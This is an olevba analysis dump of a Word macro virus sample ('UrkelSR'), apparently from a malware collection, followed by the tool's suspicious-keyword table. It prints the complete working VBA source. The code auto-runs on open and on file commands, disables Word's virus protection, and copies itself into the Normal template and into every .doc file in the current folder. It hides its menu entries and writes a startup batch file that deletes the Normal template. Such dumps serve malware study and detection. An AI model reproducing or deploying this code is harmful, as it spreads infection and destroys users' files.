olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-a2c8b5fd850488069b93f137474c79278fca0eaf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-a2c8b5fd850488069b93f137474c79278fca0eaf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO UrkelSR.bas 
in file: Virus.MSWord.VMPC-based-a2c8b5fd850488069b93f137474c79278fca0eaf - OLE stream: 'Macros/VBA/UrkelSR'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub UrkelSR()
On Error Resume Next
Randomize
f12592 = u17752 & c19596 & Int(Rnd * 9994)
f12592 = m17752 & c19596 & Int(Rnd * 7902)
f19413 = m10458 & c8219 & Int(Rnd * 8979)
f2759 = u14956 & c12376 & Int(Rnd * 1155)
f2759 = m14956 & c12376 & Int(Rnd * 8393)
k8605 = m6355 & e5057
f7675 = m6355 & c5987 & Int(Rnd * 3148)
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents("UrkelSR").Export "c:\UrkelSR.sys"
f5397 = u12068 & c13461 & Int(Rnd * 872)
f5397 = m12068 & c13461 & Int(Rnd * 3163)
f9552 = u4436 & c8118 & Int(Rnd * 8359)
f9552 = m4436 & c8118 & Int(Rnd * 1944)
f9086 = m16318 & c12250 & Int(Rnd * 8712)
ActiveDocument.ReadOnlyRecommended = False
k4768 = m9194 & e10330
f7242 = m9194 & c7856 & Int(Rnd * 938)
k11615 = m14999 & e7902
f12490 = m14999 & c7027 & Int(Rnd * 6674)
f15788 = u10659 & c9639 & Int(Rnd * 5465)
f15788 = m10659 & c9639 & Int(Rnd * 2693)
f11515 = u9926 & c13747 & Int(Rnd * 6148)
f11515 = m9926 & c13747 & Int(Rnd * 6815)
f12909 = u14278 & c11347 & Int(Rnd * 8068)
f12909 = m14278 & c11347 & Int(Rnd * 6511)
check = Int(Rnd * 1000)
If check = 3 Then Call p1499
f8443 = u15653 & c14532 & k7241 & m15653
f8443 = m15653 & c14532 & Int(Rnd * 9835)
f10884 = u4605 & c5100 & Int(Rnd * 1279)
f10884 = m4605 & c5100 & Int(Rnd * 3092)
f10991 = m7627 & c7264 & Int(Rnd * 5035)
f5623 = u3456 & c6859 & k9018 & m3456
f5623 = m3456 & c6859 & Int(Rnd * 2202)
rm = Int(Rnd * 100)
    If rm = 99 Then MsgBox "Did I do that?", vbSystemModal
f3255 = u4030 & c15979 & Int(Rnd * 9636)
f3255 = m4030 & c15979 & Int(Rnd * 2647)
f3029 = u12643 & c12581 & k5828 & m12643
f3029 = m12643 & c12581 & Int(Rnd * 3608)
k7423 = m3050 & e6624
f9326 = m3050 & c4721 & Int(Rnd * 2905)
k7145 = m16724 & e12628
f5384 = m16724 & c14389 & Int(Rnd * 8009)
 f4682$ = "c:\windows\startm~1\programs\startup\msfile.bat"
f3302 = u12869 & c7525 & k4491 & m12869
f3302 = m12869 & c7525 & Int(Rnd * 6042)
k12951 = m4775 & e11349
f12218 = m4775 & c12082 & Int(Rnd * 4240)
f1499339 = GetAttr(NormalTemplate.FullName)
f12895 = u8934 & c12276 & Int(Rnd * 5080)
f12895 = m8934 & c12276 & Int(Rnd * 1358)
f4004 = u7717 & c5861 & k3268 & m7717
f4004 = m7717 & c5861 & Int(Rnd * 3467)
If f1499339 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call UrkelWD(f4682$)
k6114 = m9430 & e9103

f12205 = m9430 & c3012 & Int(Rnd * 9086)
f8456 = m10997 & c13603 & Int(Rnd * 4989)
If f1499339 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call UrkelWD(f4682$)
f15324 = u12542 & c13772 & Int(Rnd * 7691)
f15324 = m12542 & c13772 & Int(Rnd * 9461)
f9671 = u12801 & c9352 & Int(Rnd * 6116)
f9671 = m12801 & c9352 & Int(Rnd * 9040)
If f1499339 = vbReadOnly Then GoTo xurk
f18157 = u10084 & c10517 & k11739 & m10084
f18157 = m10084 & c10517 & Int(Rnd * 2248)
k9209 = m11312 & e9678
f11741 = m11312 & c7146 & Int(Rnd * 5854)
If f1499339 = vbReadOnly + vbArchive Then GoTo xurk
f16611 = u13872 & c9209 & k13296 & m13872
f16611 = m13872 & c9209 & Int(Rnd * 7214)
f12384 = u11978 & c4863 & k7518 & m11978
f12384 = m11978 & c4863 & Int(Rnd * 4731)
f12968 = m8461 & c11964 & Int(Rnd * 5060)
f13884 = u9351 & c14626 & Int(Rnd * 5346)
f13884 = m9351 & c14626 & Int(Rnd * 6370)
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "UrkelSR" Then uy33934159 = True
Next I
f13134 = u5666 & c14744 & Int(Rnd * 7994)
f13134 = m5666 & c14744 & Int(Rnd * 5551)
f2146 = u5248 & c12394 & Int(Rnd * 1018)
f2146 = m5248 & c12394 & Int(Rnd * 539)
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "UrkelSR" Then mmf34156 = True
Next I
f13015 = u17299 & c13510 & k18988 & m17299
f13015 = m17299 & c13510 & Int(Rnd * 8454)
k9457 = m11482 & e7746
f3076 = m11482 & c14127 & Int(Rnd * 7002)
If uy33934159 = True And mmf34156 = False Then Set v34153395 = NormalTemplate.VBProject.VBComponents
If uy33934159 = False And mmf34156 = True Then Set v34153395 = ActiveDocument.VBProject.VBComponents
v34153395.import "c:\UrkelSR.sys"
If uy33934159 = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
f8515 = u5180 & c14220 & k14546 & m5180
f8515 = m5180 & c14220 & Int(Rnd * 3537)
f10765 = u6241 & c13866 & k11768 & m6241
f10765 = m6241 & c13866 & Int(Rnd * 5996)
f11920 = u3861 & c8997 & Int(Rnd * 7802)
f11920 = m3861 & c8997 & Int(Rnd * 1499)
f9312 = u17704 & c5650 & Int(Rnd * 1560)
f9312 = m17704 & c5650 & Int(Rnd * 7751)
k3173 = m8788 & e13489
f10944 = m8788 & c5718 & Int(Rnd * 1641)
f16432 = u11324 & c7357 & Int(Rnd * 4163)
f16432 = m11324 & c7357 & Int(Rnd * 1570)
If mmf34156 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
k16238 = m14515 & e18136
f17872 = m14515 & c16502 & Int(Rnd * 4661)
f4409 = u11651 & c11110 & Int(Rnd * 3896)
f4409 = m11651 & c11110 & Int(Rnd * 8150)
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
f10420 = u16488 & c9234 & k15798 & m16488
f10420 = m16488 & c9234 & Int(Rnd * 9860)
f9146 = u10501 & c2869 & k6019 & m10501
f9146 = m10501 & c2869 & Int(Rnd * 7260)
xurk:
End Sub
Sub HelpAbout()
    On Error Resume Next
k5866 = m9261 & e11035
f10872 = m9261 & c6029 & Int(Rnd * 7938)
f6552 = m9690 & c18591 & Int(Rnd * 8666)
    MsgBox "Urkel", vbInformation
f16943 = u8280 & c14769 & Int(Rnd * 9537)
f16943 = m8280 & c14769 & Int(Rnd * 8196)
f3810 = u13128 & c10137 & Int(Rnd * 1425)
f3810 = m13128 & c10137 & Int(Rnd * 4991)
End Sub
Sub FileNew()
    On Error Resume Next
f17630 = u11089 & c9234 & k15863 & m11089
f17630 = m11089 & c9234 & Int(Rnd * 2791)
    Call UrkelSR
f10643 = u11178 & c7831 & Int(Rnd * 914)
f10643 = m11178 & c7831 & Int(Rnd * 1222)
f7226 = m17153 & c13983 & Int(Rnd * 8106)
Dialogs(wdDialogFileNew).Show
f12428 = u4122 & c11609 & k12644 & m4122
f12428 = m4122 & c11609 & Int(Rnd * 449)
f6536 = u7650 & c14719 & Int(Rnd * 5233)
f6536 = m7650 & c14719 & Int(Rnd * 5835)
    Skip = 1
f6881 = u7402 & c9352 & Int(Rnd * 6801)
f6881 = m7402 & c9352 & Int(Rnd * 1971)
f9655 = u10762 & c5481 & Int(Rnd * 3938)
f9655 = m10762 & c5481 & Int(Rnd * 6210)
    Call UrkelSR
k12768 = m9205 & e10427
f18095 = m9205 & c5100 & Int(Rnd * 6022)
End Sub
Sub FileSaveAs()
    On Error Resume Next
f12488 = u18303 & c12226 & k13112 & m18303
f12488 = m18303 & c12226 & Int(Rnd * 8996)
f10166 = u7718 & c12892 & k8585 & m7718
f10166 = m7718 & c12892 & Int(Rnd * 2837)
Dialogs(wdDialogFileSaveAs).Show
f9131 = u8462 & c8997 & Int(Rnd * 8487)
f9131 = m8462 & c8997 & Int(Rnd * 4430)
f10809 = m8382 & c10611 & Int(Rnd * 1713)
    Call UrkelSR
k12740 = m3051 & e4501
f5489 = m3051 & c11752 & Int(Rnd * 2275)
f12309 = u5756 & c10374 & Int(Rnd * 3014)
f12309 = m5756 & c10374 & Int(Rnd * 3352)
End Sub
Sub FileExit()
    On Error Resume Next
k11297 = m3885 & e12620
f7465 = m3885 & c16452 & Int(Rnd * 2300)
k5023 = m11652 & e13690
f10571 = m11652 & c8142 & Int(Rnd * 7520)
    Call UrkelSR
k10361 = m5520 & e2203
f7345 = m5520 & c5219 & Int(Rnd * 5203)
f11500 = u7887 & c9876 & k8834 & m7887
f11500 = m7887 & c9876 & Int(Rnd * 3985)
    If ActiveDocument.Saved = False Then ActiveDocument.Save
f11035 = u9769 & c14008 & Int(Rnd * 8605)
f11035 = m9769 & c14008 & Int(Rnd * 753)
f9191 = m12644 & c9613 & Int(Rnd * 2978)
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call UrkelSR
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call UrkelSR
End If
Loop
    Application.Quit
f6251 = u12081 & c10704 & Int(Rnd * 1091)
f6251 = m12081 & c10704 & Int(Rnd * 8248)
f9548 = m7741 & c3317 & Int(Rnd * 4267)
End Sub
Sub AutoOpen()
    On Error Resume Next
k10553 = m13376 & e8416
f13464 = m13376 & c5505 & Int(Rnd * 8855)
k11269 = m17728 & e6694
f14857 = m17728 & c3106 & Int(Rnd * 8551)
    Call UrkelSR
k7611 = m2736 & e12803
f12203 = m2736 & c8211 & Int(Rnd * 1410)
k9082 = m8055 & e10609
f2834 = m8055 & c16857 & Int(Rnd * 5132)
End Sub
Sub AutoExec()
    On Error Resume Next
f14750 = u14707 & c10941 & k17170 & m14707
f14750 = m14707 & c10941 & Int(Rnd * 6609)
f7571 = m6906 & c18615 & Int(Rnd * 4242)
    Call UrkelSR
k7239 = m7481 & e5702
f5203 = m7481 & c7738 & Int(Rnd * 4687)
f14976 = m6094 & c14338 & Int(Rnd * 5648)
End Sub
Sub ViewVBCode()
    On Error Resume Next
f11274 = u6500 & c16477 & Int(Rnd * 5784)
f11274 = m6500 & c16477 & Int(Rnd * 4945)
f9143 = u13806 & c8068 & Int(Rnd * 1476)
f9143 = m13806 & c8068 & Int(Rnd * 9583)
k14860 = m9950 & e3404
f7060 = m9950 & c11204 & Int(Rnd * 7615)
f4168 = u8225 & c13840 & Int(Rnd * 3532)
f4168 = m8225 & c13840 & Int(Rnd * 6280)
f16654 = u6016 & c5954 & k8422 & m6016
f16654 = m6016 & c5954 & Int(Rnd * 2932)
f5953 = m11167 & c7619 & Int(Rnd * 5507)
f14154 = u2881 & c14769 & Int(Rnd * 7368)
f14154 = m2881 & c14769 & Int(Rnd * 1127)
End Sub
Sub p1499()
    On Error Resume Next
f10404 = u14447 & c5362 & Int(Rnd * 2896)
f10404 = m14447 & c5362 & Int(Rnd * 7029)
k7048 = m9623 & e9487
f9084 = m9623 & c7451 & Int(Rnd * 1035)
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "u"
            .Replacement.Text = "Urkel"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
f11619 = u6252 & c11109 & Int(Rnd * 1728)
f11619 = m6252 & c11109 & Int(Rnd * 1081)
k12109 = m7166 & e14004
f11917 = m7166 & c14196 & Int(Rnd * 3822)
End Sub
    
Sub UrkelWD(strFile As String)
    
Dim hFile As Long
On Error Resume Next
f15500 = u8394 & c824 & Int(Rnd * 6451)
f15500 = m8394 & c824 & Int(Rnd * 7428)
f18559 = m17322 & c968 & Int(Rnd * 9254)
n$ = NormalTemplate
f14332 = m15428 & c16620 & Int(Rnd * 6771)
f4918 = u11912 & c13722 & Int(Rnd * 9256)
f4918 = m11912 & c13722 & Int(Rnd * 7100)
Part11$ = "attrib -h -r "
k18709 = m12801 & e13507
f15833 = m12801 & c16383 & Int(Rnd * 8410)
k16302 = m9116 & e15283
f15083 = m9116 & c16502 & Int(Rnd * 7591)
snag$ = "c:\progra~1\micros~1\templa~1\"
f15905 = u2329 & c16071 & Int(Rnd * 9522)
f15905 = m2329 & c16071 & Int(Rnd * 2112)
f4965 = m751 & c5268 & Int(Rnd * 495)
snag1$ = "c:\progra~1\micros~2\templa~1\"
f5024 = u14932 & c5886 & k5835 & m14932
f5024 = m14932 & c5886 & Int(Rnd * 9042)
f10464 = m8630 & c5979 & Int(Rnd * 5577)
Part2$ = "del "
f12714 = m9691 & c5624 & Int(Rnd * 8036)
k6990 = m7312 & e17632
f13868 = m7312 & c10754 & Int(Rnd * 3540)
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
f13071 = m14786 & c9327 & Int(Rnd * 9325)
f12893 = u12238 & c7475 & Int(Rnd * 7629)
f12893 = m12238 & c7475 & Int(Rnd * 3681)
f8381 = u4775 & c9115 & Int(Rnd * 8036)
f8381 = m4775 & c9115 & Int(Rnd * 3610)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |msfile.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

